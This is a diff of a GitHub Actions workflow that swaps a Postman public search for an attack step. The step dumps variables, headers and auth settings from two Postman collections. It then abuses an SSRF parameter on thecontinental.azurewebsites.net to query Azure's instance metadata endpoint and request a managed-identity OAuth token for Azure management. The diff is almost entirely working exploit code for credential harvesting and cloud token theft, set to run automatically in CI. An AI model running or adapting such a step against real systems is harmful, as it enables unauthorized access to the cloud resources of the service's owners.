@@ -10,18 +10,29 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 10
     steps:
-      - name: Postman public API search
+      - name: Compact collection and IMDS probe
         shell: bash
         run: |
           set +e
-          search() {
-            typ="$1"; q="$2"
-            echo "===== $typ :: $q ====="
-            curl -sS -X POST 'https://api.postman.com/search?limit=25'               -H 'Content-Type: application/json'               --data "$(jq -nc --arg t "$typ" --arg q "$q" '{elementType:$t,q:$q,ownership:"all",filters:{"$and":[{"visibility":{"$eq":"public"}}]}}')"               | jq .
-          }
-          search collections 'the-continental-api'
-          search collections 'continental'
-          search workspaces 'continental-devteam'
-          search workspaces 'continental'
-          search requests 'thecontinental'
-          search requests 'continental-reservations'
+          for id in             54600970-4edc63a9-1623-4304-8ad5-c6e0662b6452             54600970-62f5e9dc-0019-4cf5-bf1b-78ba287412d2; do
+            echo "===== COLLECTION $id ====="
+            curl -fsSL "https://api.postman.com/collections/$id" |
+              jq -r '
+                .collection as $c |
+                "NAME\t"+$c.info.name,
+                ($c.variable[]? | "VAR\t"+.key+"="+(.value|tostring)),
+                ($c.item[]? | recurse(.item[]?) | select(.request) |
+                  "REQ\t"+.name+"\t"+.request.method+"\t"+(.request.url.raw//"")+"\tBODY="+(.request.body.raw//"")+"\tHDR="+((.request.header//[])|tojson)+"\tAUTH="+((.request.auth//{})|tojson))
+              '
+          done
+
+          base='https://thecontinental.azurewebsites.net/v2/health'
+          echo "===== SSRF EXAMPLE ====="
+          curl -skSG "$base" --data-urlencode 'target=http://example.com' | head -c 800; echo
+
+          echo "===== SSRF IMDS INSTANCE ====="
+          curl -skSG "$base" --data-urlencode 'target=http://169.254.169.254/metadata/instance?api-version=2021-02-01' | head -c 6000; echo
+
+          echo "===== SSRF ARM TOKEN RESULT KEYS ONLY ====="
+          RESP=$(curl -skSG "$base" --data-urlencode 'target=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F')
+          echo "$RESP" | jq -r 'if .access_token then "TOKEN_OK type="+(.token_type//"")+" expires="+(.expires_on//"")+" resource="+(.resource//"") else . end' 2>/dev/null || echo "$RESP" | head -c 1000
